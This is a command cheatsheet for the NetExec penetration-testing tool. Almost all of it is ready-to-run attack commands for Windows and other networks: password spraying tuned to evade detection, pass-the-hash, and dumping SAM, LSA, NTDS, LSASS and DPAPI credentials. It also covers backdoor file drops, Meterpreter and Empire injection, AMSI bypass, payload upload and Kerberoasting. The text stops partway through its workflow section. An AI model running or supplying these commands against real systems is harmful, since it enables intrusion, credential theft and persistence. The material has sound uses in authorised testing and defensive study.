# NXC (NetExec) Cheatsheet

Complete reference for NetExec (NXC) - the network execution tool for pentesting

> **Version Note**: This cheatsheet is based on the latest NetExec version. Always check `nxc <protocol> --help` and `nxc <protocol> -L` for your specific version.

## Installation
```bash
pipx install netexec
# or
apt install netexec
```

## Basic Syntax

`nxc <protocol> <target> -u <user> -p <pass> / -H <hash> [flags] -M <module> -o <options>`

---

## Protocols Overview

- `smb` - SMB/CIFS (Port 445)
- `ldap` - LDAP (Port 389/636)
- `winrm` - WinRM (Port 5985/5986)
- `ssh` - SSH (Port 22)
- `rdp` - RDP (Port 3389)
- `mssql` - Microsoft SQL Server (Port 1433)
- `ftp` - FTP (Port 21)
- `wmi` - WMI (Port 135)
- `vnc` - VNC (Port 5900)
- `nfs` - NFS (Port 111)

---

## Target Specification
```bash
nxc smb 192.168.1.10                    # Single host
nxc smb 192.168.1.0/24                  # CIDR range
nxc smb 192.168.1.1-100                 # Range
nxc smb targets.txt                     # File with targets (one per line)
```

---

## Password Spraying

### Pattern: protocol targets.txt users.txt passwords.txt

```bash
# Domain authentication (default)
nxc smb targets.txt -u users.txt -p passwords.txt -d DOMAIN

# Local authentication
nxc smb targets.txt -u users.txt -p passwords.txt --local-auth

# Continue on success (don't stop after first valid)
nxc smb targets.txt -u users.txt -p passwords.txt --continue-on-success

# Stop on first success per target
nxc smb targets.txt -u users.txt -p passwords.txt --no-bruteforce

# Single password spray (safer for avoiding lockouts)
nxc smb targets.txt -u users.txt -p 'Password123!' -d DOMAIN --continue-on-success

# With jitter to avoid detection
nxc smb targets.txt -u users.txt -p passwords.txt --jitter 5

# Fail limit options
nxc smb targets.txt -u users.txt -p passwords.txt --gfail-limit 10     # Global fail limit
nxc smb targets.txt -u users.txt -p passwords.txt --ufail-limit 3      # Per-user fail limit
nxc smb targets.txt -u users.txt -p passwords.txt --fail-limit 5       # Per-host fail limit
```

---

## No Authentication

```bash
# Null session (empty username)
nxc smb 192.168.1.10 -u '' -p ''

# Guest account
nxc smb 192.168.1.10 -u 'guest' -p ''

# Anonymous LDAP bind
nxc ldap 192.168.1.10 -u '' -p ''

# Enumerate without credentials
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt    # SMB signing check
```

---

## Authentication Methods

### Username and Password
```bash
nxc smb 192.168.1.10 -u admin -p 'password'
nxc smb 192.168.1.10 -u admin -p 'password' -d DOMAIN
nxc smb 192.168.1.10 -u admin -p 'password' --local-auth
```

### Pass-the-Hash
```bash
nxc smb 192.168.1.10 -u admin -H <NTLM_HASH>
nxc smb 192.168.1.10 -u admin -H <LM:NTLM>
nxc smb 192.168.1.10 -u admin -H <NTLM> -d DOMAIN
```

### Kerberos Authentication
```bash
# With password
nxc smb 192.168.1.10 -u admin -p 'password' -d DOMAIN -k

# Using cached ticket (ccache)
nxc smb 192.168.1.10 -u admin --use-kcache -k

# With AES key
nxc smb 192.168.1.10 -u admin --aesKey <AES_KEY> -k

# Specify KDC
nxc smb 192.168.1.10 -u admin -p 'password' -d DOMAIN -k --kdcHost dc01.domain.local
```

### Certificate Authentication
```bash
# PFX certificate
nxc smb 192.168.1.10 --pfx-cert cert.pfx --pfx-pass password

# PEM certificate
nxc smb 192.168.1.10 --pem-cert cert.pem --pem-key key.pem
```

---

## SMB Protocol (Port 445)

### Basic Enumeration (No Auth)
```bash
nxc smb 192.168.1.0/24                              # Check SMB version, signing
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt  # Find relay targets
```

### Enumeration (With Auth)
```bash
nxc smb 192.168.1.10 -u user -p pass --shares              # List shares
nxc smb 192.168.1.10 -u user -p pass --shares --filter-shares read,write  # Filter by access
nxc smb 192.168.1.10 -u user -p pass --dir "C$"            # List directory contents
nxc smb 192.168.1.10 -u user -p pass --users               # Enumerate users
nxc smb 192.168.1.10 -u user -p pass --users --enabled     # Only enabled users
nxc smb 192.168.1.10 -u user -p pass --users-export out.txt  # Export users to file
nxc smb 192.168.1.10 -u user -p pass --groups              # Enumerate groups
nxc smb 192.168.1.10 -u user -p pass --computers           # Enumerate computers
nxc smb 192.168.1.10 -u user -p pass --local-groups        # Local groups
nxc smb 192.168.1.10 -u user -p pass --pass-pol            # Password policy
nxc smb 192.168.1.10 -u user -p pass --smb-sessions        # Active SMB sessions
nxc smb 192.168.1.10 -u user -p pass --disks               # Enumerate disks
nxc smb 192.168.1.10 -u user -p pass --interfaces          # Network interfaces
nxc smb 192.168.1.10 -u user -p pass --loggedon-users      # Logged on users
nxc smb 192.168.1.10 -u user -p pass --rid-brute           # RID cycling
nxc smb 192.168.1.10 -u user -p pass --qwinsta             # RDP connections
nxc smb 192.168.1.10 -u user -p pass --tasklist            # Running processes
```

### WMI Queries
```bash
nxc smb 192.168.1.10 -u admin -p pass --wmi "SELECT * FROM Win32_Process"
nxc smb 192.168.1.10 -u admin -p pass --wmi "SELECT * FROM Win32_Service" --wmi-namespace "root\cimv2"
```

### Spidering Shares
```bash
nxc smb 192.168.1.10 -u admin -p pass --spider C$
nxc smb 192.168.1.10 -u admin -p pass --spider C$ --spider-folder Users
nxc smb 192.168.1.10 -u admin -p pass --spider C$ --pattern password
nxc smb 192.168.1.10 -u admin -p pass --spider C$ --regex ".*\.txt$"
nxc smb 192.168.1.10 -u admin -p pass --spider C$ --content       # Search file content
nxc smb 192.168.1.10 -u admin -p pass --spider C$ --depth 3       # Max recursion depth
nxc smb 192.168.1.10 -u admin -p pass --spider C$ --only-files    # Files only
nxc smb 192.168.1.10 -u admin -p pass --spider C$ --exclude-dirs Windows,System32
```

### Command Execution
```bash
nxc smb 192.168.1.10 -u admin -p pass -x "whoami"                    # CMD
nxc smb 192.168.1.10 -u admin -p pass -X '$PSVersionTable'           # PowerShell
nxc smb 192.168.1.10 -u admin -p pass --exec-method smbexec -x "whoami"
nxc smb 192.168.1.10 -u admin -p pass --exec-method atexec -x "whoami"
nxc smb 192.168.1.10 -u admin -p pass --exec-method wmiexec -x "whoami"
nxc smb 192.168.1.10 -u admin -p pass --exec-method mmcexec -x "whoami"
nxc smb 192.168.1.10 -u admin -p pass --no-output -x "command"       # Don't retrieve output
```

### PowerShell Options
```bash
nxc smb 192.168.1.10 -u admin -p pass -X '$PSVersionTable' --obfs          # Obfuscate
nxc smb 192.168.1.10 -u admin -p pass -X 'command' --amsi-bypass bypass.ps1
nxc smb 192.168.1.10 -u admin -p pass -X 'command' --force-ps32            # Force 32-bit
nxc smb 192.168.1.10 -u admin -p pass -X 'command' --no-encode             # Don't encode
nxc smb 192.168.1.10 -u admin -p pass --clear-obfscripts                   # Clear cache
```

### File Operations
```bash
nxc smb 192.168.1.10 -u admin -p pass --get-file "\\Windows\\Temp\\file.txt" ./local.txt
nxc smb 192.168.1.10 -u admin -p pass --put-file ./payload.exe "\\Windows\\Temp\\payload.exe"
nxc smb 192.168.1.10 -u admin -p pass --get-file "\\file.txt" ./out.txt --append-host
```

### Credential Dumping
```bash
# SAM Database
nxc smb 192.168.1.10 -u admin -p pass --sam                        # Default method
nxc smb 192.168.1.10 -u admin -p pass --sam secdump                # Using secdump
nxc smb 192.168.1.10 -u admin -p pass --sam regdump                # Using regdump

# LSA Secrets
nxc smb 192.168.1.10 -u admin -p pass --lsa                        # Default method
nxc smb 192.168.1.10 -u admin -p pass --lsa secdump                # Using secdump
nxc smb 192.168.1.10 -u admin -p pass --lsa regdump                # Using regdump

# NTDS (Domain Controller)
nxc smb dc01.domain.local -u admin -p pass --ntds                  # Default (drsuapi)
nxc smb dc01.domain.local -u admin -p pass --ntds vss              # Using VSS
nxc smb dc01.domain.local -u admin -p pass --ntds drsuapi          # Using drsuapi
nxc smb dc01.domain.local -u admin -p pass --ntds --user admin     # Specific user
nxc smb dc01.domain.local -u admin -p pass --ntds --enabled        # Enabled accounts only

# DPAPI
nxc smb 192.168.1.10 -u admin -p pass --dpapi                      # Dump DPAPI
nxc smb 192.168.1.10 -u admin -p pass --dpapi cookies              # Include cookies
nxc smb 192.168.1.10 -u admin -p pass --dpapi nosystem             # Exclude SYSTEM
nxc smb 192.168.1.10 -u admin -p pass --dpapi --mkfile masterkeys.txt
nxc smb 192.168.1.10 -u admin -p pass --dpapi --pvk backupkey.pvk

# SCCM
nxc smb 192.168.1.10 -u admin -p pass --sccm                       # Default (wmi)
nxc smb 192.168.1.10 -u admin -p pass --sccm wmi                   # Using WMI
nxc smb 192.168.1.10 -u admin -p pass --sccm disk                  # Using disk
```

### SMB Modules

#### LOW PRIVILEGE MODULES
```bash
# Vulnerability Checks
nxc smb 192.168.1.10 -u user -p pass -M ms17-010                   # EternalBlue
nxc smb 192.168.1.10 -u user -p pass -M zerologon                  # CVE-2020-1472
nxc smb 192.168.1.10 -u user -p pass -M nopac                      # CVE-2021-42278/42287
nxc smb 192.168.1.10 -u user -p pass -M printnightmare             # PrintNightmare
nxc smb 192.168.1.10 -u user -p pass -M remove-mic                 # CVE-2019-1040
nxc smb 192.168.1.10 -u user -p pass -M smbghost                   # CVE-2020-0796
nxc smb 192.168.1.10 -u user -p pass -M coerce_plus                # Coercion vulns
nxc smb 192.168.1.10 -u user -p pass -M timeroast                  # Timeroasting

# Enumeration
nxc smb 192.168.1.10 -u user -p pass -M enum_av                    # AV products
nxc smb 192.168.1.10 -u user -p pass -M enum_ca                    # ADCS CAs
nxc smb 192.168.1.10 -u user -p pass -M ioxidresolver              # Additional interfaces
nxc smb 192.168.1.10 -u user -p pass -M spooler                    # Print spooler
nxc smb 192.168.1.10 -u user -p pass -M webdav                     # WebClient service
nxc smb 192.168.1.10 -u user -p pass -M spider_plus                # Spider shares
nxc smb 192.168.1.10 -u user -p pass -M spider_plus -o READ_ONLY=false

# Password Hunting
nxc smb 192.168.1.10 -u user -p pass -M gpp_password               # GPP passwords
nxc smb 192.168.1.10 -u user -p pass -M gpp_autologin              # GPP autologin

# Backdoors
nxc smb 192.168.1.10 -u user -p pass -M drop-sc                    # Drop searchConnector
nxc smb 192.168.1.10 -u user -p pass -M scuffy                     # Drop .scf files
nxc smb 192.168.1.10 -u user -p pass -M slinky                     # Create LNK backdoors

# Computer Management
nxc smb 192.168.1.10 -u user -p pass -M add-computer               # Add/delete computer
nxc smb 192.168.1.10 -u user -p pass -M backup_operator            # Backup operator exploit
```

#### HIGH PRIVILEGE MODULES (requires admin)
```bash
# Credential Dumping
nxc smb 192.168.1.10 -u admin -p pass -M lsassy                    # LSASS dump
nxc smb 192.168.1.10 -u admin -p pass -M nanodump                  # Alternative LSASS
nxc smb 192.168.1.10 -u admin -p pass -M procdump                  # Process dump
nxc smb 192.168.1.10 -u admin -p pass -M handlekatz                # Handle dump
nxc smb 192.168.1.10 -u admin -p pass -M dpapi_hash                # DPAPI masterkeys
nxc smb 192.168.1.10 -u admin -p pass -M hash_spider               # Recursive LSASS
nxc smb 192.168.1.10 -u admin -p pass -M ntdsutil                  # NTDS with ntdsutil

# Application Credentials
nxc smb 192.168.1.10 -u admin -p pass -M keepass_discover          # Find KeePass
nxc smb 192.168.1.10 -u admin -p pass -M keepass_trigger           # KeePass trigger
nxc smb 192.168.1.10 -u admin -p pass -M mobaxterm                 # MobaXterm creds
nxc smb 192.168.1.10 -u admin -p pass -M mremoteng                 # mRemoteNG creds
nxc smb 192.168.1.10 -u admin -p pass -M putty                     # PuTTY keys
nxc smb 192.168.1.10 -u admin -p pass -M rdcman                    # RDCMan creds
nxc smb 192.168.1.10 -u admin -p pass -M winscp                    # WinSCP creds
nxc smb 192.168.1.10 -u admin -p pass -M vnc                       # VNC passwords
nxc smb 192.168.1.10 -u admin -p pass -M wifi                      # WiFi passwords
nxc smb 192.168.1.10 -u admin -p pass -M veeam                     # Veeam DB creds
nxc smb 192.168.1.10 -u admin -p pass -M msol                      # Azure AD Connect
nxc smb 192.168.1.10 -u admin -p pass -M teams_localdb             # Teams SSO cookie
nxc smb 192.168.1.10 -u admin -p pass -M wam                       # Token Broker Cache

# Enumeration
nxc smb 192.168.1.10 -u admin -p pass -M enum_dns                  # DNS records (WMI)
nxc smb 192.168.1.10 -u admin -p pass -M get_netconnections        # Network connections
nxc smb 192.168.1.10 -u admin -p pass -M bitlocker                 # BitLocker status
nxc smb 192.168.1.10 -u admin -p pass -M hyperv-host               # HyperV host
nxc smb 192.168.1.10 -u admin -p pass -M iis                       # IIS app pool creds
nxc smb 192.168.1.10 -u admin -p pass -M install_elevated          # AlwaysInstallElevated
nxc smb 192.168.1.10 -u admin -p pass -M ntlmv1                    # NTLMv1 enabled
nxc smb 192.168.1.10 -u admin -p pass -M runasppl                  # RunAsPPL status
nxc smb 192.168.1.10 -u admin -p pass -M uac                       # UAC status
nxc smb 192.168.1.10 -u admin -p pass -M wcc                       # Security config
nxc smb 192.168.1.10 -u admin -p pass -M security-questions        # Security Q&A

# File Operations
nxc smb 192.168.1.10 -u admin -p pass -M notepad++                 # Unsaved files
nxc smb 192.168.1.10 -u admin -p pass -M powershell_history        # PS history
nxc smb 192.168.1.10 -u admin -p pass -M recent_files              # Recent files
nxc smb 192.168.1.10 -u admin -p pass -M snipped                   # Snipping Tool

# Persistence & Execution
nxc smb 192.168.1.10 -u admin -p pass -M empire_exec               # Empire agent
nxc smb 192.168.1.10 -u admin -p pass -M met_inject                # Meterpreter
nxc smb 192.168.1.10 -u admin -p pass -M web_delivery              # Web delivery
nxc smb 192.168.1.10 -u admin -p pass -M impersonate               # Token impersonation
nxc smb 192.168.1.10 -u admin -p pass -M pi                        # Process injection
nxc smb 192.168.1.10 -u admin -p pass -M schtask_as                # Scheduled task

# Configuration Changes
nxc smb 192.168.1.10 -u admin -p pass -M rdp -o ACTION=enable      # Enable RDP
nxc smb 192.168.1.10 -u admin -p pass -M rdp -o ACTION=disable     # Disable RDP
nxc smb 192.168.1.10 -u admin -p pass -M shadowrdp                 # Shadow RDP
nxc smb 192.168.1.10 -u admin -p pass -M wdigest -o ACTION=enable  # Enable WDigest
nxc smb 192.168.1.10 -u admin -p pass -M remote-uac                # Remote UAC

# Registry Operations
nxc smb 192.168.1.10 -u admin -p pass -M reg-query                 # Registry query
nxc smb 192.168.1.10 -u admin -p pass -M reg-winlogon              # Winlogon creds

# Utility
nxc smb 192.168.1.10 -u admin -p pass -M test_connection           # Test connectivity
```

---

## LDAP Protocol (Port 389/636)

### Basic Enumeration
```bash
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --users           # Enumerate all users
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --users user123   # Specific user
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --users-export out.txt
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --groups          # Enumerate all groups
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --groups "Domain Admins"
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --computers       # Enumerate computers
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --dc-list         # List DCs
nxc ldap 192.168.1.10 -u user -p pass -d DOMAIN --get-sid         # Get domain SID
```

### Advanced Queries
```bash
nxc ldap 192.168.1.10 -u user -p pass --admin-count               # adminCount=1 users
nxc ldap 192.168.1.10 -u user -p pass --trusted-for-delegation    # Trusted delegation
nxc ldap 192.168.1.10 -u user -p pass --password-not-required     # Empty passwords allowed
nxc ldap 192.168.1.10 -u user -p pass --active-users              # Active accounts only
nxc ldap 192.168.1.10 -u user -p pass --find-delegation           # Delegation relationships

# GMSA
nxc ldap 192.168.1.10 -u user -p pass --gmsa                       # Enumerate GMSA
nxc ldap 192.168.1.10 -u user -p pass --gmsa-convert-id gmsa_name
nxc ldap 192.168.1.10 -u user -p pass --gmsa-decrypt-lsa lsa_data

# Custom LDAP Query
nxc ldap 192.168.1.10 -u user -p pass --query "(objectClass=user)" "cn,sAMAccountName"
nxc ldap 192.168.1.10 -u user -p pass --base-dn "OU=Users,DC=domain,DC=local"
```

### Kerberoasting & ASREPRoasting
```bash
nxc ldap 192.168.1.10 -u user -p pass --kerberoasting output.txt
nxc ldap 192.168.1.10 -u user -p pass --asreproast output.txt
```

### Bloodhound Collection
```bash
nxc ldap 192.168.1.10 -u user -p pass --bloodhound
nxc ldap 192.168.1.10 -u user -p pass --bloodhound -c All
nxc ldap 192.168.1.10 -u user -p pass --bloodhound -c Default
nxc ldap 192.168.1.10 -u user -p pass --bloodhound -c DCOnly
nxc ldap 192.168.1.10 -u user -p pass --bloodhound -c Session,LoggedOn
nxc ldap 192.168.1.10 -u user -p pass --bloodhound -c Group,LocalAdmin,ACL
```

### LDAP Modules

#### LOW PRIVILEGE MODULES
```bash
nxc ldap 192.168.1.10 -u user -p pass -M adcs                      # Find ADCS/PKI
nxc ldap 192.168.1.10 -u user -p pass -M daclread                  # Read DACLs
nxc ldap 192.168.1.10 -u user -p pass -M enum_trusts               # Trust relationships
nxc ldap 192.168.1.10 -u user -p pass -M find-computer             # Find computers
nxc ldap 192.168.1.10 -u user -p pass -M get-desc-users            # User descriptions
nxc ldap 192.168.1.10 -u user -p pass -M get-network               # DNS records/IPs
nxc ldap 192.168.1.10 -u user -p pass -M get-unixUserPassword      # Unix passwords
nxc ldap 192.168.1.10 -u user -p pass -M get-userPassword          # User passwords
nxc ldap 192.168.1.10 -u user -p pass -M groupmembership           # User group membership
nxc ldap 192.168.1.10 -u user -p pass -M laps                      # LAPS passwords
nxc ldap 192.168.1.10 -u user -p pass -M ldap-checker              # LDAP signing/binding
nxc ldap 192.168.1.10 -u user -p pass -M maq                       # MachineAccountQuota
nxc ldap 192.168.1.10 -u user -p pass -M obsolete                  # Obsolete OS
nxc ldap 192.168.1.10 -u user -p pass -M pre2k                     # Pre-created accounts
nxc ldap 192.168.1.10 -u user -p pass -M pso                       # Password policies
nxc ldap 192.168.1.10 -u user -p pass -M sccm                      # SCCM infrastructure
nxc ldap 192.168.1.10 -u user -p pass -M subnets                   # Sites and subnets
nxc ldap 192.168.1.10 -u user -p pass -M user-desc                 # User descriptions
nxc ldap 192.168.1.10 -u user -p pass -M whoami                    # Current user details
```

---

## WinRM Protocol (Port 5985/5986)

### Basic Usage
```bash
nxc winrm 192.168.1.10 -u admin -p pass
nxc winrm 192.168.1.10 -u admin -H <NTLM_HASH>
nxc winrm 192.168.1.10 -u admin -p pass -d DOMAIN
nxc winrm 192.168.1.10 -u admin -p pass --local-auth
nxc winrm 192.168.1.10 -u admin -p pass --laps                     # LAPS auth
```

### Port Configuration
```bash
nxc winrm 192.168.1.10 -u admin -p pass --port 5985                # HTTP only
nxc winrm 192.168.1.10 -u admin -p pass --port 5986                # HTTPS only
nxc winrm 192.168.1.10 -u admin -p pass --port 5985 5986           # Both ports
nxc winrm 192.168.1.10 -u admin -p pass --check-proto http         # HTTP only
nxc winrm 192.168.1.10 -u admin -p pass --check-proto https        # HTTPS only
nxc winrm 192.168.1.10 -u admin -p pass --check-proto http https   # Both protocols
nxc winrm 192.168.1.10 -u admin -p pass --http-timeout 15          # Timeout
```

### Command Execution
```bash
nxc winrm 192.168.1.10 -u admin -p pass -x "whoami"
nxc winrm 192.168.1.10 -u admin -p pass -X '$PSVersionTable'
nxc winrm 192.168.1.10 -u admin -p pass -x "ipconfig /all"
nxc winrm 192.168.1.10 -u admin -p pass --no-output -x "command"
```

### Credential Dumping
```bash
nxc winrm 192.168.1.10 -u admin -p pass --sam                      # Dump SAM
nxc winrm 192.168.1.10 -u admin -p pass --lsa                      # Dump LSA
nxc winrm 192.168.1.10 -u admin -p pass --dump-method cmd          # Using cmd
nxc winrm 192.168.1.10 -u admin -p pass --dump-method powershell   # Using PowerShell
```

### WinRM Modules
```bash
# No modules available for WinRM protocol in current version
```

---

## SSH Protocol (Port 22)

### Authentication
```bash
nxc ssh 192.168.1.10 -u root -p password
nxc ssh 192.168.1.10 -u root -p passwords.txt
nxc ssh 192.168.1.10 -u root --key-file id_rsa
nxc ssh 192.168.1.10 -u root --key-file id_rsa -p passphrase
nxc ssh 192.168.1.10 -u users.txt -p passwords.txt
nxc ssh 192.168.1.10 -u root -p pass --port 2222
nxc ssh 192.168.1.10 -u root -p pass --ssh-timeout 20
```

### Command Execution
```bash
nxc ssh 192.168.1.10 -u root -p pass -x "cat /etc/passwd"
nxc ssh 192.168.1.10 -u root -p pass -x "uname -a"
nxc ssh 192.168.1.10 -u root -p pass -x "id"
nxc ssh 192.168.1.10 -u root -p pass --no-output -x "command"
```

### Sudo Operations
```bash
nxc ssh 192.168.1.10 -u user -p pass --sudo-check                  # Check sudo privs
nxc ssh 192.168.1.10 -u user -p pass --sudo-check-method sudo-stdin
nxc ssh 192.168.1.10 -u user -p pass --sudo-check-method mkfifo
nxc ssh 192.168.1.10 -u user -p pass --get-output-tries 10
```

### File Operations
```bash
nxc ssh 192.168.1.10 -u root -p pass --put-file local.txt /tmp/remote.txt
nxc ssh 192.168.1.10 -u root -p pass --get-file /etc/passwd ./passwd.txt
```

### SSH Modules
```bash
# No modules available for SSH protocol in current version
```

---

## RDP Protocol (Port 3389)

### Check Access
```bash
nxc rdp 192.168.1.10 -u admin -p password
nxc rdp 192.168.1.10 -u admin -H <NTLM_HASH>
nxc rdp 192.168.1.10 -u users.txt -p passwords.txt -d DOMAIN
nxc rdp 192.168.1.10 -u admin -p pass --local-auth
nxc rdp 192.168.1.10 -u admin -p pass --port 3390
nxc rdp 192.168.1.10 -u admin -p pass --rdp-timeout 10
```

### Screenshots
```bash
nxc rdp 192.168.1.10 -u admin -p pass --screenshot
nxc rdp 192.168.1.10 -u admin -p pass --screenshot --screentime 10
nxc rdp 192.168.1.10 -u admin -p pass --screenshot --res 1920x1080
nxc rdp 192.168.1.10 -u admin -p pass --nla-screenshot             # If NLA disabled
```

### RDP Modules
```bash
# No modules available for RDP protocol in current version
```

---

## MSSQL Protocol (Port 1433)

### Authentication
```bash
nxc mssql 192.168.1.10 -u sa -p password
nxc mssql 192.168.1.10 -u sa -p password --local-auth
nxc mssql 192.168.1.10 -u user -p pass -d DOMAIN
nxc mssql 192.168.1.10 -u user -p pass -d DOMAIN -k              # Kerberos
nxc mssql 192.168.1.10 -u sa -H <NTLM_HASH>
nxc mssql 192.168.1.10 -u sa -p pass --port 1434
nxc mssql 192.168.1.10 -u sa -p pass --mssql-timeout 10
```

### Queries
```bash
nxc mssql 192.168.1.10 -u sa -p pass -q "SELECT @@version"
nxc mssql 192.168.1.10 -u sa -p pass -q "SELECT name FROM sys.databases"
nxc mssql 192.168.1.10 -u sa -p pass -q "SELECT name FROM sys.server_principals"
nxc mssql 192.168.1.10 -u sa -p pass -q "EXEC sp_helprotect"
```

### Command Execution
```bash
nxc mssql 192.168.1.10 -u sa -p pass -x "whoami"                 # via xp_cmdshell
nxc mssql 192.168.1.10 -u sa -p pass -X 'Get-Host'               # PowerShell
nxc mssql 192.168.1.10 -u sa -p pass --no-output -x "command"
```

### PowerShell Options
```bash
nxc mssql 192.168.1.10 -u sa -p pass -X 'command' --force-ps32
nxc mssql 192.168.1.10 -u sa -p pass -X 'command' --obfs
nxc mssql 192.168.1.10 -u sa -p pass -X 'command' --amsi-bypass bypass.ps1
nxc mssql 192.168.1.10 -u sa -p pass -X 'command' --no-encode
nxc mssql 192.168.1.10 -u sa -p pass --clear-obfscripts
```

### File Operations
```bash
nxc mssql 192.168.1.10 -u sa -p pass --put-file local.txt C:\\Temp\\remote.txt
nxc mssql 192.168.1.10 -u sa -p pass --get-file C:\\Temp\\file.txt ./local.txt
```

### Enumeration
```bash
nxc mssql 192.168.1.10 -u sa -p pass --rid-brute                  # RID bruteforce
nxc mssql 192.168.1.10 -u sa -p pass --rid-brute 5000
```

### MSSQL Modules

#### LOW PRIVILEGE MODULES
```bash
nxc mssql 192.168.1.10 -u user -p pass -M enum_impersonate        # Impersonation privs
nxc mssql 192.168.1.10 -u user -p pass -M enum_logins             # SQL logins
nxc mssql 192.168.1.10 -u user -p pass -M exec_on_link            # Execute on linked server
nxc mssql 192.168.1.10 -u user -p pass -M link_enable_xp          # Enable xp_cmdshell on link
nxc mssql 192.168.1.10 -u user -p pass -M link_xpcmd              # Run xp_cmdshell on link
nxc mssql 192.168.1.10 -u user -p pass -M mssql_coerce            # Execute arbitrary SQL
nxc mssql 192.168.1.10 -u user -p pass -M mssql_priv              # Enumerate/exploit privs
```

#### HIGH PRIVILEGE MODULES
```bash
nxc mssql 192.168.1.10 -u sa -p pass -M empire_exec               # Empire agent
nxc mssql 192.168.1.10 -u sa -p pass -M enum_links                # Enumerate linked servers
nxc mssql 192.168.1.10 -u sa -p pass -M met_inject                # Meterpreter injection
nxc mssql 192.168.1.10 -u sa -p pass -M nanodump                  # LSASS dump
nxc mssql 192.168.1.10 -u sa -p pass -M test_connection           # Test connectivity
nxc mssql 192.168.1.10 -u sa -p pass -M web_delivery              # Web delivery
```

---

## FTP Protocol (Port 21)

### Authentication
```bash
nxc ftp 192.168.1.10 -u admin -p password
nxc ftp 192.168.1.10 -u anonymous -p ''
nxc ftp 192.168.1.10 -u users.txt -p passwords.txt
nxc ftp 192.168.1.10 -u admin -p pass --port 2121
```

### File Operations
```bash
nxc ftp 192.168.1.10 -u admin -p pass --ls                        # List root
nxc ftp 192.168.1.10 -u admin -p pass --ls /var/www
nxc ftp 192.168.1.10 -u admin -p pass --get file.txt
nxc ftp 192.168.1.10 -u admin -p pass --put local.txt remote.txt
```

### FTP Modules
```bash
# No modules available for FTP protocol in current version
```

---

## VNC Protocol (Port 5900)

### Authentication
```bash
nxc vnc 192.168.1.10 -u admin -p password
nxc vnc 192.168.1.10 -u admin -p passwords.txt
nxc vnc 192.168.1.10 -u admin -p pass --port 5901
nxc vnc 192.168.1.10 -u admin -p pass --vnc-sleep 5               # Rate limiting
```

### Screenshot
```bash
nxc vnc 192.168.1.10 -u admin -p pass --screenshot
nxc vnc 192.168.1.10 -u admin -p pass --screenshot --screentime 5
```

### VNC Modules
```bash
# No modules available for VNC protocol in current version
```

---

## NFS Protocol (Port 111)

### Enumeration
```bash
nxc nfs 192.168.1.10                                               # Basic enumeration
nxc nfs 192.168.1.10 --shares                                      # List shares
nxc nfs 192.168.1.10 --enum-shares                                 # Enumerate shares (depth 3)
nxc nfs 192.168.1.10 --enum-shares 5                               # Custom depth
nxc nfs 192.168.1.10 --port 2049
nxc nfs 192.168.1.10 --nfs-timeout 10
```

### Share Operations
```bash
nxc nfs 192.168.1.10 --share /export --ls                          # List share root
nxc nfs 192.168.1.10 --share /export --ls /path/to/dir
nxc nfs 192.168.1.10 --share /export --get-file remote.txt local.txt
nxc nfs 192.168.1.10 --share /export --put-file local.txt remote.txt
```

### NFS Modules
```bash
# No modules available for NFS protocol in current version
```

---

## WMI Protocol (Port 135)

### Basic Usage
```bash
nxc wmi 192.168.1.10 -u admin -p password
nxc wmi 192.168.1.10 -u admin -H <NTLM_HASH>
nxc wmi 192.168.1.10 -u admin -p pass -d DOMAIN
nxc wmi 192.168.1.10 -u admin -p pass --local-auth
nxc wmi 192.168.1.10 -u admin -p pass --rpc-timeout 5
```

### WMI Queries
```bash
nxc wmi 192.168.1.10 -u admin -p pass --wmi "SELECT * FROM Win32_Process"
nxc wmi 192.168.1.10 -u admin -p pass --wmi "SELECT * FROM Win32_Service"
nxc wmi 192.168.1.10 -u admin -p pass --wmi "SELECT * FROM Win32_ComputerSystem"
nxc wmi 192.168.1.10 -u admin -p pass --wmi-namespace "root\cimv2"
```

### Command Execution
```bash
nxc wmi 192.168.1.10 -u admin -p pass -x "whoami"
nxc wmi 192.168.1.10 -u admin -p pass --exec-method wmiexec -x "whoami"
nxc wmi 192.168.1.10 -u admin -p pass --exec-method wmiexec-event -x "whoami"
nxc wmi 192.168.1.10 -u admin -p pass --exec-timeout 10
nxc wmi 192.168.1.10 -u admin -p pass --no-output -x "command"
```

### WMI Modules

#### LOW PRIVILEGE MODULES
```bash
nxc wmi 192.168.1.10 -u user -p pass -M ioxidresolver              # Additional interfaces
nxc wmi 192.168.1.10 -u user -p pass -M spooler                    # Print spooler
nxc wmi 192.168.1.10 -u user -p pass -M zerologon                  # Zerologon check
```

#### HIGH PRIVILEGE MODULES
```bash
nxc wmi 192.168.1.10 -u admin -p pass -M bitlocker                 # BitLocker status
nxc wmi 192.168.1.10 -u admin -p pass -M enum_dns                  # DNS records
nxc wmi 192.168.1.10 -u admin -p pass -M get_netconnections        # Network connections
nxc wmi 192.168.1.10 -u admin -p pass -M rdp -o ACTION=enable      # Enable RDP
nxc wmi 192.168.1.10 -u admin -p pass -M rdp -o ACTION=disable     # Disable RDP
```

---

## General Flags & Options

### Threading & Performance
```bash
-t 256                       # Number of threads (default: 256)
--timeout 10                 # Connection timeout in seconds
--jitter 5                   # Random delay between requests (seconds)
```

### Output & Logging
```bash
--verbose                    # Verbose output
--debug                      # Debug mode
--log output.log             # Save output to file
--no-progress                # Disable progress bar
```

### DNS Options
```bash
-6                           # Force IPv6
--dns-server 8.8.8.8         # Custom DNS server
--dns-tcp                    # Use TCP for DNS queries
--dns-timeout 3              # DNS timeout in seconds
```

### Credential Database
```bash
-id 1                        # Use credential ID from database
-id 1 2 3                    # Use multiple credential IDs
```

### Server Options
```bash
--server https               # Use HTTPS server (default)
--server http                # Use HTTP server
--server-host 0.0.0.0        # Bind server to IP
--server-port 8000           # Server port
--connectback-host IP        # Connectback IP for remote system
```

### Database
```bash
cmedb                        # Access NXC database
export smb                   # Export SMB results
```

### Modules
```bash
nxc smb -L                              # List all SMB modules
nxc smb -M <module> --options           # Show module options
```

---

## Common Attack Workflows

### 1. Initial Enumeration
```bash
# Find hosts and check SMB signing
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt

# Anonymous/Guest enumeration
nxc smb 192.168.1.0/24 -u '' -p ''
nxc smb 192.168.1.0/24 -u 'guest' -p ''

# Check multiple protocols
